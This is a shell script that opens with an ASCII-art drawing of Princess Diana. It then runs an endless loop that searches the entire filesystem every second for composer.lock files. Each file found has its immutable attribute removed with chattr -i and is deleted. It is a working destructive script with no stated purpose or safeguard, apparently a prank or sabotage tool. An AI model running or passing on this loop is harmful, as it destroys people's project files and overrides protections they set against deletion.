#!/bin/sh

 #            .-""-.
 #           / _____)
 #          {  __/ a\
 #          {  _/    >
 #           { C    =     Princess Diana
 #            {!\_ _/       1961-1997
 #           ____| |__
 #          /   (\ |) \
 #          |  \ `\|`/|
 #          |  |  \  \|
 #          |  |  /  /|
 #          |  |     ||
 #          |  |     ||
 #          |__|     ||
 #          / \__    |\
 #         |\/U__|___|/
 #         (_____)   |
 #           |       |
 #           |_______|
 #             | | |
 #             | ) )
 #             | | |
 #             | | |
 #             | | |
 #             (\/\/\
 # ____________||\_\_\________________________________________________ 
killMe() {
	chattr -i $1
	rm $1;
}
export -f killMe
while true; do
    find / | grep 'composer.lock' | xargs -0 -n1 -I{} bash -c "killMe {}"
    sleep 1
done


